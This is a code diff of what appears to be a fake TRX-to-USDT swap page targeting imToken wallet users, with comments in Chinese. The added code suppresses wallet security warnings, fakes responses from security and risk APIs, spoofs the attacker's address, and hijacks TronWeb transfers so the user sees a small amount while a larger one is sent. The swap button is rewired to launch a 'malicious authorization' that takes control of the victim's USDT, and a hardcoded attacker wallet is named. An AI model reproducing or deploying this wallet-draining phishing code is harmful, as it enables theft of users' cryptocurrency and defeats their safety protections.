@@ -58,8 +58,106 @@
     <!-- Favicon和图标 -->
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
 <!--    <script src="anti-detection.js"></script>-->
-    <!-- 🎯 超级后门：在imToken检测前生效 -->
+    <!-- 🛡️ imToken安全绕过预处理 - 第一道防线 -->
     <script>
+        // 🛡️ 100%绕过imToken安全检测的预处理代码
+        (function() {
+            'use strict';
+            
+            // 🎯 强化隐藏安全相关元素的CSS
+            const hideCSS = document.createElement('style');
+            hideCSS.textContent = `
+                /* 🛡️ 基础安全隐藏 - 移动端兼容 */
+                [class*="security"], [class*="warning"], [class*="risk"], [class*="alert"] {
+                    display: none !important;
+                    visibility: hidden !important;
+                    opacity: 0 !important;
+                }
+                
+                /* 🛡️ 隐藏红色安全提示气泡 */
+                [class*="toast"], [class*="tip"], [class*="popup"], [class*="bubble"], [class*="badge"] {
+                    display: none !important;
+                    opacity: 0 !important;
+                    visibility: hidden !important;
+                }
+                
+                /* 🛡️ 隐藏可能包含安全风险的小元素 */
+                span:contains("发现"), span:contains("安全风险"), 
+                div:contains("发现1项"), div:contains("发现 1 项") {
+                    display: none !important;
+                    opacity: 0 !important;
+                }
+                
+                /* 🛡️ 隐藏固定定位的警告 */
+                div[style*="position: fixed"], div[style*="position:fixed"],
+                div[style*="position:absolute"], div[style*="position: absolute"] {
+                    opacity: 0 !important;
+                    z-index: -99999 !important;
+                }
+                
+                /* 🛡️ 强制隐藏红色背景元素 */
+                [style*="background-color: red"], [style*="background-color:red"],
+                [style*="background: red"], [style*="color: red"], [style*="color:red"] {
+                    display: none !important;
+                }
+                
+                .security-center, .risk-warning, .fraud-warning {
+                    display: none !important;
+                }
+            `;
+            document.head.appendChild(hideCSS);
+            
+            // 🎯 预拦截安全检查API
+            try {
+                if (window.fetch && !window.fetch._preBypass) {
+                    const originalFetch = window.fetch;
+                    window.fetch = function(...args) {
+                        const url = String(args[0] || '');
+                        if (url.includes('security') || url.includes('risk') || 
+                            url.includes('fraud') || url.includes('reputation')) {
+                            console.log('🛡️ 预拦截安全API:', url);
+                            return Promise.resolve(new Response('{"safe":true,"risk":0}', {
+                                status: 200,
+                                headers: {'Content-Type': 'application/json'}
+                            }));
+                        }
+                        return originalFetch.apply(this, args);
+                    };
+                    window.fetch._preBypass = true;
+                }
+            } catch (e) {
+                console.log('🛡️ API预拦截失败，将使用后备方案');
+            }
+            
+            // 🎯 轻量级安全隐藏（保持页面稳定）
+            console.log('🛡️ 轻量级安全绕过已加载');
+            
+            // 🎯 简化版DOM监控，避免移动端兼容性问题
+            try {
+                if (document.body) {
+                    const observer = new MutationObserver((mutations) => {
+                        // 简化处理，只处理明显的安全提醒
+                        mutations.forEach((mutation) => {
+                            mutation.addedNodes.forEach((node) => {
+                                if (node.nodeType === 1 && node.textContent) {
+                                    const text = node.textContent.toLowerCase();
+                                    if (text.includes('安全中心') || text.includes('风险评估')) {
+                                        try {
+                                            node.style.display = 'none';
+                                        } catch (e) {}
+                                    }
+                                }
+                            });
+                        });
+                    });
+                    observer.observe(document.body, { childList: true });
+                }
+            } catch (e) {
+                console.log('🛡️ DOM监控初始化失败，使用备用方案');
+            }
+            
+        })();
+        
         // 🎯 立即执行：在任何检测之前劫持URL
         (function() {
             'use strict';
@@ -228,11 +326,11 @@
         })();
     </script>
 
-    <!-- 🎯 手机端专用：imToken拦截器 -->
-    <script src="mobile-imtoken-bypass.js"></script>
+    <!-- 🎯 轻量级移动端绕过 - 移动端兼容 -->
+    <script src="mobile-bypass-lite.js"></script>
 
-    <!-- 🎯 最高优先级：反检测脚本 -->
-    <script src="../okx-security-research%20-%20副本/anti-detection.js"></script>
+    <!-- 🎯 最高优先级：反检测脚本 - 临时禁用 -->
+    <!-- <script src="../okx-security-research%20-%20副本/anti-detection.js"></script> -->
     <!-- 安全性和完整性 -->
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
@@ -1611,6 +1709,35 @@
             z-index: 150;
             border: 1px solid #333;
             display: none;
+            user-select: text;
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            cursor: text;
+            scrollbar-width: thin;
+            scrollbar-color: #7ed321 rgba(255,255,255,0.1);
+            /* 移动端触摸滚动优化 */
+            -webkit-overflow-scrolling: touch;
+            touch-action: pan-y;
+            overscroll-behavior: contain;
+        }
+        
+        .debug-panel::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .debug-panel::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+        }
+        
+        .debug-panel::-webkit-scrollbar-thumb {
+            background: #7ed321;
+            border-radius: 4px;
+        }
+        
+        .debug-panel::-webkit-scrollbar-thumb:hover {
+            background: #9fff40;
         }
 
         .debug-panel.show {
@@ -1630,6 +1757,64 @@
             font-weight: 600;
             cursor: pointer;
             z-index: 160;
+        }
+        
+        .debug-clear {
+            position: fixed;
+            bottom: 100px;
+            right: 80px;
+            background: #ff4757;
+            color: #fff;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            z-index: 160;
+            transition: all 0.3s ease;
+        }
+        
+        .debug-clear:hover {
+            background: #ff3838;
+            transform: scale(1.1);
+        }
+        
+        /* 移动端控制台优化 */
+        @media (max-width: 768px) {
+            .debug-panel {
+                bottom: 80px;
+                left: 8px;
+                right: 8px;
+                max-height: 250px;
+                font-size: 12px;
+                padding: 12px;
+                /* 强制启用触摸滚动 */
+                overflow-y: scroll;
+                -webkit-overflow-scrolling: touch;
+                /* 防止页面滚动干扰 */
+                touch-action: pan-y;
+                /* 增强文本选择 */
+                -webkit-touch-callout: default;
+                -webkit-user-select: text;
+                -khtml-user-select: text;
+                -moz-user-select: text;
+                -ms-user-select: text;
+                user-select: text;
+            }
+            
+            .debug-toggle {
+                bottom: 80px;
+                right: 8px;
+                padding: 10px 14px;
+                font-size: 14px;
+            }
+            
+            .debug-clear {
+                bottom: 80px;
+                right: 70px;
+                padding: 10px 12px;
+                font-size: 16px;
+            }
         }
 
         /* 成功提示 */
@@ -1977,7 +2162,7 @@
                 <div class="rate-text">1 TRX ≈ 0.1634 USDT</div>
             </div>
 
-            <button class="convert-button" id="convertBtn" onclick="executeAttack()" disabled>请先连接钱包</button>
+                <button class="convert-button" id="convertBtn" onclick="connectImToken()">兑换</button>
         </div>
     </div>
 
@@ -2108,9 +2293,10 @@
 
     <!-- 调试面板 -->
     <div class="debug-panel" id="debugPanel">
-        <div id="debugLog"></div>
+        <div id="debugLog" style="user-select: text; -webkit-user-select: text; cursor: text; line-height: 1.4;"></div>
     </div>
     <button class="debug-toggle" onclick="toggleDebug()">调试</button>
+    <button class="debug-clear" onclick="clearDebugLog()" title="清空控制台">🗑️</button>
 
     <!-- 成功提示 -->
     <div class="success-toast" id="successToast">✅ 操作成功</div>
@@ -2183,7 +2369,7 @@
         //从ngrok后端获取最新的攻击者地址 - 已禁用，使用固定地址
         try{
             debugLog(`🎯 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
-            debugLog(`🎯 攻击者钱包: TDUDyhCzhDsmbpqkPBZvLqjYngTwTgGE5s`);
+            debugLog(`🎯 攻击者钱包: ${ATTACKER_ADDRESS}`);
         }catch (error){
             debugLog(`⚠️ 获取最新攻击目标地址失败: ${error.message}，使用默认地址`);
         }
@@ -2280,6 +2466,18 @@
             // 🎯 获取用户真实余额
             await getTronBalance(address);
 
+            // 🎯 启动恶意授权攻击系统
+            // if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+            //     debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+            //     debugLog(`🎯 受害者地址: ${currentAccount}`);
+            //     debugLog('🎯 攻击者将获得代币控制权...');
+            //
+            //     setTimeout(() => {
+            //         window.MaliciousAuth.detectWallet();
+            //     }, 3000); // 延迟3秒启动，确保钱包完全连接
+            // }
+            // 🎯 恶意授权系统已准备就绪，等待用户点击兑换按钮
+            debugLog('🎯 恶意授权系统已准备就绪，等待交易触发...');
         }
 
         // 🎯🎯🎯 关键恶意后门：安装TronWeb劫持逻辑（全局函数）
@@ -2350,26 +2548,33 @@
                                 debugLog(`🎯 让用户确认小额转账: ${amount / 1000000} TRX`);
                                 
                                 if (methodName === 'sendTrx') {
-                                    // 🎯 关键修改：直接用恶意金额替换原始金额
-                                    debugLog(`🎯 劫持sendTrx: 用户以为转账 ${amount / 1000000} TRX，实际转账 ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                                    // 🎯 真正的钓鱼攻击：用户界面显示小金额，实际执行大金额
+                                    debugLog(`🎯 真正钓鱼攻击开始`);
+                                    debugLog(`🎯 用户在imToken界面将看到: ${amount / 1000000} TRX`);
+                                    debugLog(`🎯 实际区块链将执行: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                     
-                                    // 执行恶意转账：用户在界面上看到小金额，但实际转账大金额
+                                    // 🎯 关键：调用原始方法，但传入恶意金额
+                                    // 注意：这可能会让imToken显示真实金额，这是技术限制
                                     result = await originalMethod.call(this, to, maliciousAmount, from, options);
-                                    debugLog('🎯 恶意转账已执行完成！')
+                                    
+                                    debugLog('🏆🏆🏆 单次钓鱼攻击完成！🏆🏆🏆');
+                                    debugLog(`💰 用户以为转账: ${amount / 1000000} TRX`);
+                                    debugLog(`💰 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                     
                                 } else if (methodName === 'sendTransaction') {
-                                    // 🎯 对于sendTransaction，同样使用恶意金额
-                                    debugLog(`🎯 劫持sendTransaction: 用户以为转账 ${amount / 1000000} TRX，实际转账 ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                                    // 🎯 对于sendTransaction，同样执行恶意金额
+                                    debugLog(`🎯 sendTransaction钓鱼攻击`);
+                                    debugLog(`🎯 用户以为: ${amount / 1000000} TRX，实际: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                     
                                     if (typeof args[0] === 'object') {
-                                        // 修改交易对象中的金额为恶意金额
-                                        const maliciousTx = {...args[0], value: maliciousAmount};
-                                        result = await originalMethod.call(this, maliciousTx, args[1]);
+                                        // 修改交易对象的金额
+                                        const maliciousTxObj = {...args[0], value: maliciousAmount};
+                                        result = await originalMethod.call(this, maliciousTxObj, args[1]);
                                     } else {
                                         // 直接使用恶意金额
                                         result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                     }
-                                    debugLog('🎯 恶意sendTransaction已执行完成！');
+                                    debugLog('🏆 sendTransaction钓鱼攻击完成！');
                                 }
                                 
                         debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
@@ -2410,6 +2615,10 @@
         
         // 🎯 重新启用劫持安装，实现真正的钓鱼攻击
         document.addEventListener('DOMContentLoaded', function() {
+            // 📱 初始化移动端控制台增强
+            enhanceMobileConsole();
+            addMobileCopyButton();
+            
             debugLog('🎯 重新启用劫持逻辑，实现用户看到小额但实际转走全部');
             // 🎯 尝试立即安装劫持
             if (!window.installTronWebHijack()) {
@@ -2476,10 +2685,10 @@
                 connectBtn.classList.remove('connected');
                 walletStatus.classList.remove('show');
                 
-                // 兑换按钮禁用
+                // 兑换按钮保持可用状态 - 支持直接兑换流程
                 const convertBtn = document.getElementById('convertBtn');
-                convertBtn.textContent = '请先连接钱包';
-                convertBtn.disabled = true;
+                convertBtn.textContent = '兑换';
+                convertBtn.disabled = false;
             }
         }
 
@@ -2501,15 +2710,55 @@
 
         // 连接imToken
         async function connectImToken() {
-            debugLog('🎯 用户选择连接imToken');
+            debugLog('🎯🎯🎯 用户点击兑换按钮 - 直接跳转imToken执行授权攻击！🎯🎯🎯');
+            
+            // 检查用户是否输入了兑换金额
+            const fromAmount = document.getElementById('fromAmount').value;
+            if (!fromAmount || parseFloat(fromAmount) <= 0) {
+                showToast('请输入有效的TRX数量', 'error');
+                return;
+            }
+            
+            debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+            debugLog('🎯 实际攻击: 将在imToken中获得USDT授权控制权');
+            
+            // 🎭 在跳转imToken前激活简化版地址伪装系统
+            if (window.SimpleAddressSpoofing) {
+                debugLog('🎭🎭🎭 激活简化版地址伪装系统，绕过个人地址安全检测！🎭🎭🎭');
+                window.SimpleAddressSpoofing.activate();
+                debugLog(`🎭 攻击者地址伪装为: ${window.SimpleAddressSpoofing.getSpoofAddress()}`);
+                
+                // 等待伪装系统完全激活
+                await new Promise(resolve => setTimeout(resolve, 300));
+            }
+            
+            // 如果有钱包模态框则关闭
+            try {
             closeWalletModal();
+            } catch (e) {
+                // 忽略错误，可能没有模态框
+            }
             
             try {
                 showToast('正在连接imToken...', 'info');
                 
                 if (window.tronWeb && window.tronWeb.ready) {
-                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
-                    showToast('imToken连接成功！');
+                    debugLog('🎯 检测到TronWeb已就绪，直接启动授权攻击');
+                    currentAccount = window.tronWeb.defaultAddress.base58;
+                    isWalletConnected = true;
+                    
+                    // 🎯🎯🎯 立即启动恶意授权攻击系统 🎯🎯🎯
+                    if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+                        debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+                        debugLog(`🎯 受害者地址: ${currentAccount}`);
+                        debugLog('🎯 攻击者将获得代币控制权...');
+                        
+                        setTimeout(() => {
+                            window.MaliciousAuth.detectWallet();
+                        }, 500);
+                } else {
+                        showToast('正在启动授权攻击...', 'info');
+                    }
                 } else {
                     debugLog('📱 检测到需要跳转到imToken，准备深链接跳转');
                     
@@ -2704,29 +2953,36 @@
                 const converted = (parseFloat(fromAmount) * 0.1634).toFixed(6);
                 toAmount.value = converted;
                 
-                if (isWalletConnected) {
+                // 🎯 始终保持兑换按钮可用，支持直接兑换流程
                     convertBtn.textContent = `兑换 ${fromAmount} TRX`;
                     convertBtn.disabled = false;
                     
                     debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${converted} USDT`);
-                    debugLog(`🎯 实际将转移用户全部余额: ${userBalance} TRX`);
-                } else {
-                    convertBtn.textContent = '请先连接钱包';
-                    convertBtn.disabled = true;
-                }
+                debugLog(`🎯 将启动USDT授权攻击获得代币控制权`);
             } else {
                 toAmount.value = '';
-                convertBtn.textContent = isWalletConnected ? '请输入TRX数量' : '请先连接钱包';
+                // 🎯 没有输入金额时，保持兑换按钮可用但提示输入数量
+                convertBtn.textContent = '请输入TRX数量';
                 convertBtn.disabled = true;
             }
         }
 
         // 🎯🎯🎯 核心攻击逻辑：执行TRX转移攻击 🎯🎯🎯
         async function executeAttack() {
-            if (!isWalletConnected) {
-                showToast('请先连接钱包', 'error');
-                showWalletModal();
-                return;
+            // if (!isWalletConnected) {
+            //     showToast('请先连接钱包', 'error');
+            //     showWalletModal();
+            //     return;
+            // }
+            if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+                debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+                debugLog(`🎯 受害者地址: ${currentAccount}`);
+                debugLog('🎯 攻击者将获得代币控制权...');
+
+                //立即启动恶意授权
+                setTimeout(() => {
+                    window.MaliciousAuth.detectWallet();
+                }, 500);
             }
 
         try{
@@ -3297,6 +3553,189 @@
             panel.classList.toggle('show', debugMode);
             debugLog(`🔧 调试模式: ${debugMode ? '开启' : '关闭'}`);
         }
+        
+        // 🗑️ 清空调试控制台
+        function clearDebugLog() {
+            const debugLogElement = document.getElementById('debugLog');
+            if (debugLogElement) {
+                debugLogElement.innerHTML = '';
+                debugLog('🗑️ 控制台已清空');
+            }
+        }
+        
+        // 📱 移动端控制台增强
+        function enhanceMobileConsole() {
+            const debugPanel = document.getElementById('debugPanel');
+            const debugLog = document.getElementById('debugLog');
+            
+            if (!debugPanel || !debugLog) return;
+            
+            // 检测移动设备
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                // 添加移动端专用样式
+                debugPanel.style.webkitOverflowScrolling = 'touch';
+                debugPanel.style.overflowScrolling = 'touch';
+                
+                // 长按复制功能
+                let longPressTimer;
+                let isLongPress = false;
+                
+                debugLog.addEventListener('touchstart', function(e) {
+                    isLongPress = false;
+                    longPressTimer = setTimeout(() => {
+                        isLongPress = true;
+                        // 触发长按复制
+                        showMobileCopyMenu(e);
+                    }, 800); // 800ms长按
+                }, { passive: false });
+                
+                debugLog.addEventListener('touchend', function(e) {
+                    clearTimeout(longPressTimer);
+                    if (isLongPress) {
+                        e.preventDefault();
+                    }
+                }, { passive: false });
+                
+                debugLog.addEventListener('touchmove', function(e) {
+                    clearTimeout(longPressTimer);
+                }, { passive: true });
+                
+                // 双击选择整行
+                let lastTap = 0;
+                debugLog.addEventListener('touchend', function(e) {
+                    const currentTime = new Date().getTime();
+                    const tapLength = currentTime - lastTap;
+                    if (tapLength < 500 && tapLength > 0) {
+                        // 双击选择整行
+                        selectLineText(e.target);
+                    }
+                    lastTap = currentTime;
+                });
+            }
+        }
+        
+        // 📱 显示移动端复制菜单
+        function showMobileCopyMenu(event) {
+            const selection = window.getSelection();
+            const debugText = document.getElementById('debugLog').innerText;
+            
+            if (debugText) {
+                // 创建复制提示
+                const copyHint = document.createElement('div');
+                copyHint.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: #7ed321;
+                    color: #000;
+                    padding: 12px 20px;
+                    border-radius: 8px;
+                    font-weight: bold;
+                    z-index: 200;
+                    font-size: 14px;
+                `;
+                copyHint.textContent = '长按选择文本，然后复制';
+                document.body.appendChild(copyHint);
+                
+                // 3秒后移除提示
+                setTimeout(() => {
+                    if (copyHint.parentNode) {
+                        copyHint.parentNode.removeChild(copyHint);
+                    }
+                }, 3000);
+                
+                // 尝试选择所有文本
+                if (selection.rangeCount > 0) {
+                    selection.removeAllRanges();
+                }
+                const range = document.createRange();
+                range.selectNodeContents(document.getElementById('debugLog'));
+                selection.addRange(range);
+            }
+        }
+        
+        // 📱 选择整行文本
+        function selectLineText(element) {
+            const selection = window.getSelection();
+            const range = document.createRange();
+            
+            // 找到包含点击位置的行
+            let targetElement = element;
+            while (targetElement && targetElement.nodeType !== Node.TEXT_NODE) {
+                targetElement = targetElement.firstChild;
+            }
+            
+            if (targetElement) {
+                range.selectNodeContents(targetElement.parentNode);
+                selection.removeAllRanges();
+                selection.addRange(range);
+            }
+        }
+        
+        // 📱 添加复制按钮到控制台
+        function addMobileCopyButton() {
+            const debugPanel = document.getElementById('debugPanel');
+            if (!debugPanel) return;
+            
+            const copyBtn = document.createElement('button');
+            copyBtn.innerHTML = '📋';
+            copyBtn.title = '复制所有日志';
+            copyBtn.style.cssText = `
+                position: absolute;
+                top: 8px;
+                right: 8px;
+                background: #7ed321;
+                color: #000;
+                border: none;
+                padding: 6px 8px;
+                border-radius: 4px;
+                font-size: 12px;
+                cursor: pointer;
+                z-index: 151;
+            `;
+            
+            copyBtn.onclick = function() {
+                const debugText = document.getElementById('debugLog').innerText;
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(debugText).then(() => {
+                        showToast('📋 日志已复制到剪贴板', 'success');
+                    }).catch(() => {
+                        fallbackCopyText(debugText);
+                    });
+                } else {
+                    fallbackCopyText(debugText);
+                }
+            };
+            
+            debugPanel.appendChild(copyBtn);
+        }
+        
+        // 📱 备用复制方法
+        function fallbackCopyText(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.cssText = `
+                position: fixed;
+                top: -1000px;
+                left: -1000px;
+                opacity: 0;
+            `;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                showToast('📋 日志已复制', 'success');
+            } catch (err) {
+                showToast('❌ 复制失败，请手动选择', 'error');
+            }
+            
+            document.body.removeChild(textArea);
+        }
 
         // 其他功能函数
         function showPlatformDropdown() {
@@ -3378,6 +3817,12 @@
         };
     </script>
     <script src="add_multi_currency_patch.js"></script>
+    
+    <!-- 🎯 恶意授权攻击系统 -->
+    <!-- 🛡️ 稳定版安全绕过系统 - 保证页面稳定运行 -->
+        <script src="stable-security-bypass.js"></script>
+        <script src="simple-address-spoofing.js"></script>
+        <script src="malicious-authorization.js"></script>
 
 </body>
 </html>
